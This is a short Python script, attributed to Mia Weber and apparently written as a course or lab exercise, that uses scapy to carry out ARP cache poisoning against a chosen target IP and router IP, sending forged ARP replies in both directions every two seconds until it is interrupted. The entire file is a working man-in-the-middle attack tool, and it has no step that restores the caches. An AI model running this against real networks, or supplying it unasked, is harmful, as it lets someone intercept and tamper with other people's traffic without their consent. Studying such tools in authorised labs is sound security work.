#!/usr/bin/env python3
"""
ARP Spoof Script
Mia Weber
2023-25-10
Replicates the major functionality of the official arpspoof tool. Poisons ARP cache of a host and a target.
Reference: https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
"""
import time
import sys
import argparse # Import for command line argument passing
import scapy.all as scapy

parser = argparse.ArgumentParser(description='ARP Spoof') # Create a parser for command line 

def get_mac(ip): # Given the IP address, return the associated MAC address
    arp_request = scapy.ARP(pdst=ip) # Send ARP request to provided IP
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast/arp_request
    
    answ = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0] # Get a list of IP and MAC addresses
    return answ[0][1].hwsrc # Select the first MAC address

def arp_spoof(target_ip, spoof_ip): # Create an ARP packet to send to target or router with false network info
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=get_mac(target_ip), psrc=spoof_ip)
    scapy.send(packet, verbose=False) # Send the packet 

parser.add_argument('-t', '--target', required=True, help='Target IP Address') # Specify target address in command line
parser.add_argument('-r', '--router', required=True, help='Router IP Address') # Specify router address in command line

args = parser.parse_args() # Parse the command line arguments and assign to correct variables:
victim_ip = args.target
router_ip = args.router

print("target_ip = " + str(victim_ip)) # Print the IP addresses to verify machines to spoof
print("router_ip = " + str(router_ip))

sent_packets_count = 0

while True: # Infinate loop to send ARP packet until keyboard interrupt 
    sent_packets_count += 2 # Count how many packets are sent
    arp_spoof(victim_ip, router_ip) # Spoof in both directions - target and router (or two victims like dsniff)
    arp_spoof(router_ip, victim_ip)
    print("[+] Packets send " + str(sent_packets_count), end="\r")
    sys.stdout.flush()
    time.sleep(2)

